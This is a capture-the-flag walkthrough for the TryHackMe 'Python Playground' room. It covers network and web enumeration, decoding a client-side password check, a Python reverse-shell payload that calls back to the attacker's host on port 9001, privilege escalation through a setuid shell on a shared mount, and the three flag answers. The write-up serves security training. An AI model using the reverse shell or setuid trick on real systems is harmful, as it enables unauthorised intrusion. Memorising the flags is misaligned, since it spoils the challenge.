# Python Playground

Be creative!

[Python Playground](https://tryhackme.com/room/pythonplayground)

## Topic's

- Network Enumeration
- Web Enumeration
- Web Poking
- Python Scripting (Decoder)
- Misconfigured Binaries

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Hack it!

Jump in and grab those flags! They can all be found in the usual places (/home/someuser and /root).

```
kali@kali:~/CTFs/tryhackme/Python Playground$ sudo nmap -A -sS -sC -sV -O 10.10.251.33
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-18 13:51 CEST
Nmap scan report for 10.10.251.33
Host is up (0.038s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 f4:af:2f:f0:42:8a:b5:66:61:3e:73:d8:0d:2e:1c:7f (RSA)
|   256 36:f0:f3:aa:6b:e3:b9:21:c8:88:bd:8d:1c:aa:e2:cd (ECDSA)
|_  256 54:7e:3f:a9:17:da:63:f2:a2:ee:5c:60:7d:29:12:55 (ED25519)
80/tcp open  http    Node.js Express framework
|_http-title: Python Playground!
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/18%OT=22%CT=1%CU=39766%PV=Y%DS=2%DC=T%G=Y%TM=5F8C2C
OS:59%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST
OS:11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC
OS:N(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT      ADDRESS
1   37.95 ms 10.8.0.1
2   38.07 ms 10.10.251.33

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.13 seconds
```

[http://10.10.251.33/](http://10.10.251.33/)

[http://10.10.251.33/login.html](http://10.10.251.33/login.html)

[http://10.10.251.33/signup.html](http://10.10.251.33/signup.html)

```
kali@kali:~/CTFs/tryhackme/Python Playground$ gobuster dir -u http://10.10.251.33 -w /usr/share/dirb/wordlists/common.txt -x html
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.251.33
[+] Threads:        10
[+] Wordlist:       /usr/share/dirb/wordlists/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html
[+] Timeout:        10s
===============================================================
2020/10/18 13:54:29 Starting gobuster
===============================================================
/admin.html (Status: 200)
/index.html (Status: 200)
/index.html (Status: 200)
/login.html (Status: 200)
/signup.html (Status: 200)
===============================================================
2020/10/18 13:55:05 Finished
===============================================================
```

[http://10.10.251.33/admin.html](http://10.10.251.33/admin.html)

[view-source:http://10.10.251.33/admin.html](view-source:http://10.10.251.33/admin.html)

```html
<script>
  // I suck at server side code, luckily I know how to make things secure without it - Connor

  function string_to_int_array(str) {
    const intArr = [];

    for (let i = 0; i < str.length; i++) {
      const charcode = str.charCodeAt(i);

      const partA = Math.floor(charcode / 26);
      const partB = charcode % 26;

      intArr.push(partA);
      intArr.push(partB);
    }

    return intArr;
  }

  function int_array_to_text(int_array) {
    let txt = "";

    for (let i = 0; i < int_array.length; i++) {
      txt += String.fromCharCode(97 + int_array[i]);
    }

    return txt;
  }

  document.forms[0].onsubmit = function (e) {
    e.preventDefault();

    if (document.getElementById("username").value !== "connor") {
      document.getElementById("fail").style.display = "";
      return false;
    }

    const chosenPass = document.getElementById("inputPassword").value;

    const hash = int_array_to_text(
      string_to_int_array(int_array_to_text(string_to_int_array(chosenPass)))
    );

    if (hash === "dxeedxebdwemdwesdxdtdweqdxefdxefdxdudueqduerdvdtdvdu") {
      window.location = "super-secret-admin-testing-panel.html";
    } else {
      document.getElementById("fail").style.display = "";
    }
    return false;
  };
</script>
```

[http://10.10.251.33/super-secret-admin-testing-panel.html](http://10.10.251.33/super-secret-admin-testing-panel.html)

```py
def text_to_unicode(string):
    uni=[]
    for char in string:
         a=ord(char)
         a -= 97
         uni.append(str(a))
    return uni

def unicode_to_text(string):
    out=""
    for char in range(0,len(string),2):
         a = int(string[char])
         b = int(string[char +1])
         temp = a * 26
         temp += b
         out += chr(temp)
    return out

if __name__ == "__main__":
     hash="dxeedxebdwemdwesdxdtdweqdxefdxefdxdudueqduerdvdtdvdu"
     stri1 = text_to_unicode(hash)
     stri2 = unicode_to_text(stri1)
     stri3 = text_to_unicode(stri2)
     password = unicode_to_text(stri3)
     print(password)
```

`spaghetti1245`

```py
subprocess = __import__('subprocess')
os = __import__('os')
socket =  __import__('socket')

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.106.222",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

```
kali@kali:~/CTFs/tryhackme/Python Playground$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.8.106.222] from (UNKNOWN) [10.10.251.33] 44732
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# script -qc /bin/bash /dev/null
root@playgroundweb:~/app# ^Z
[1]+  Stopped                 nc -lnvp 9001
kali@kali:~/CTFs/tryhackme/Python Playground$ stty raw -echo
kali@kali:~/CTFs/tryhackme/Python Playground$ nc -lnvp 9001

root@playgroundweb:~/app# export TERM=screen
root@playgroundweb:~/app# cd /root
root@playgroundweb:~# ls
app  flag1.txt
root@playgroundweb:~# cat flag1.txt
THM{7e0b5cf043975e3c104a458a8d4f6f2f}
root@playgroundweb:~#
```

```
kali@kali:~/CTFs/tryhackme/Python Playground$ python3 getConnorPW.py
Connor's password is: spaghetti1245
```

```
connor@pythonplayground:~$ ls -la
total 36
drwxr-xr-x 4 connor connor 4096 May 16 06:05 .
drwxr-xr-x 3 root   root   4096 May 11 22:10 ..
-rw-r--r-- 1 connor connor  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 connor connor 3789 May 11 22:16 .bashrc
drwx------ 2 connor connor 4096 May 11 22:15 .cache
-rw-rw-r-- 1 connor connor   38 May 16 02:40 flag2.txt
drwx------ 3 connor connor 4096 May 11 22:15 .gnupg
-rw-r--r-- 1 connor connor  807 Apr  4  2018 .profile
-rw-rw-r-- 1 connor connor   40 May 11 22:19 .vimrc
connor@pythonplayground:~$ cat flag2.txt
THM{69a36d6f9da10d23ca0dbfdf6e691ec5}
```

```
root@playgroundweb:~# cp /bin/sh /mnt/log
root@playgroundweb:~# chmod +s /mnt/log/sh
root@playgroundweb:~# ls -l /mnt/log/sh
-rwsr-sr-x 1 root root 129816 Oct 18 12:13 /mnt/log/sh
root@playgroundweb:~#
```

```
connor@pythonplayground:~$ /var/log/sh -p
# cd root
/var/log/sh: 1: cd: can't cd to root
# cd /root/
# ls
flag3.txt
# cat flag3.txt
THM{be3adc69c25ad14eb79da4eb57925ad1}
```

1. What is flag 1?

`THM{7e0b5cf043975e3c104a458a8d4f6f2f}`

2. What is flag 2?

`THM{69a36d6f9da10d23ca0dbfdf6e691ec5}`

3. What is flag 3?

`THM{be3adc69c25ad14eb79da4eb57925ad1}`
